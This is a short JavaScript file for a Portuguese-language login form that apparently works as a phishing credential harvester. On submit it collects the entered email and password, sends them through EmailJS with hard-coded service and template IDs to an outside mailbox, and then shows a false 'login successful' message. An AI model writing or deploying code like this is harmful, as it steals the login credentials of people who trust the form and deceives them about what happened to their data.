emailjs.init({
    publicKey: "eCZbBiWrvV67Y03l3",
});

document.getElementById("forms").addEventListener("submit", function (event) {
    event.preventDefault();

    const formData = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value
    }

    const serviceID = "service_jhwj5ur";
    const templateID = "template_fcvdgf8";
    const submitButton = document.getElementById("button");
    submitButton.textContent = "Enviando...";

    emailjs.send(serviceID, templateID, formData).then(() => {
        Toastify({
            text: "Login realizado com sucesso!",
            duration: 3000

        }).showToast();
    })
        .catch((error) => {
            console.error("Erro ao enviar os dados:", error);
        })
        .finally(() => {
            submitButton.textContent = "Entrar";
        })

});